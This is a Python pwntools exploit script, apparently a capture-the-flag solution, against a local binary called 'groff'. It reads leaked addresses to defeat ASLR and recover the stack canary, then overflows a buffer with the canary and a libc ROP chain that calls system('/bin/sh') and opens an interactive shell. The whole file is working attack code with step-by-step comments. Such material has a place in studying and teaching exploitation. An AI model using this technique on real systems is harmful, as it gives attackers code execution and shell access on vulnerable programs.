from pwn import *

class exploit(object):
    padding = 40
    
    def __init__(self, binary, libc): # initialize object
        self.proc   = process(binary) # start process
        self.binary = ELF(binary)     # create ELF object from binary
        self.libc   = ELF(libc)       # create ELF object from libc
    
    def extractValue(self, linesToSkip, spacesToSkip=0): # method used to extract debugging information from process
        for i in range(linesToSkip):                     # skip lines
            self.proc.recvline()
        for i in range(spacesToSkip + 1):                # skip individual values
            self.proc.recvuntil(" ")
        
        value = int(self.proc.recv(18), base=16)         # format extracted value
        return value

    def makeRop(self):                                            # method used to build the ropchain
        self.rop = ROP(self.libc)                                 # create ROP object from libc
        self.rop.system(self.libc.search("/bin/sh\x00").next())   # append system("/bin/sh") to the ropchain
        self.rop.exit()                                           # append exit() to the ropchain
        return str(self.rop)                                      # return the ropchain

    def buildExploit(self):                 # method used to build the actual exploit
        self.exp  = 'A' * exploit.padding   # fill the buffer with A's
        self.exp += p64(self.canary)        # overwrite the canary with its own value
        self.exp += "ROTFLMAO"              # overwrite RBP with junk data
        self.exp += self.makeRop()          # overwrite RIP with beginning of the ropchain
        return self.exp                     # return the exploit string

    def run(self):
        self.binary.address = self.extractValue(1) - self.binary.symbols["groff"]                    # extract and update the base address of the binary
        log.success("Binary base address is {0}".format(hex(self.binary.address)))                   
        self.canary = self.extractValue(4)                                                           # extract the canary value
        log.success("Canary value is {0}".format(hex(self.canary)))
        self.libc.address = self.extractValue(0, 1) - self.libc.symbols["__libc_start_main"] - 241   # extract and update the base address of the libc
        log.success("Libc base address is {0}".format(hex(self.libc.address)))
        
        self.proc.recv()
        self.proc.sendline(self.buildExploit()) # send exploit string
        self.proc.recv()
        self.proc.interactive()                 # profit :)

if __name__ == "__main__":
    context.clear(arch="amd64")
    LOCATION = "./groff"                         # position of the binary 
    LIBC_LOC = "/lib/x86_64-linux-gnu/libc.so.6" # position of libc, make sure it matches yours by running ldd ./groff
    
    pwnd = exploit(LOCATION, LIBC_LOC)
    pwnd.run()                                   # run the exploit
    
